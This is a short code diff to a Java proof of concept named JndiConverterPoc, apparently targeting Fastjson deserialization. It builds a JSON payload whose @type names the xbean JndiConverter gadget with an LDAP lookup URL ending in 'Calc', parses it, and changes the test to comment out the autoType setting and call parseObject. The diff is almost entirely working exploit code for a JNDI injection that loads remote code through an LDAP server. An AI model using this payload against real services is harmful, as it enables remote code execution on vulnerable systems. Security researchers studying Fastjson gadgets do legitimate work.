@@ -28,9 +28,9 @@ public class JndiConverterPoc {
   }
 
   public static void main(String[] args) {
-    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+//    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
-    JSON.parse(payload);
+    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://127.0.0.1:1389/Calc\"}";//ldap方式
+    JSON.parseObject(payload);
   }
 }
